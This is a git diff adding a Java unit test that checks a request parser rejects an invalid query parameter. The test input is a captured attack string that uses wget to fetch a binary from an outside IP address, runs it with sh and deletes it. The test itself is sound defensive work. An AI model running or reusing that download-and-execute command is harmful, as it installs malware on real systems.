@@ -64,6 +64,17 @@ class RequestParserTest {
     }
 
     @Test
+    void parseQueryParamsWithInvalidValue() {
+        var request = new RequestImpl(null, null);
+
+        // the query string is from actual cases of production
+        Map<String, Deque<String>> params = Map.of("cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo", new ArrayDeque<>());
+        assertThatThrownBy(() -> parser.parseQueryParams(request, params))
+                .isInstanceOf(BadRequestException.class)
+                .hasMessageContaining("failed to parse query param");
+    }
+
+    @Test
     void parseBody() throws Throwable {
         var request = new RequestImpl(null, null);
         request.contentType = ContentType.TEXT_XML;
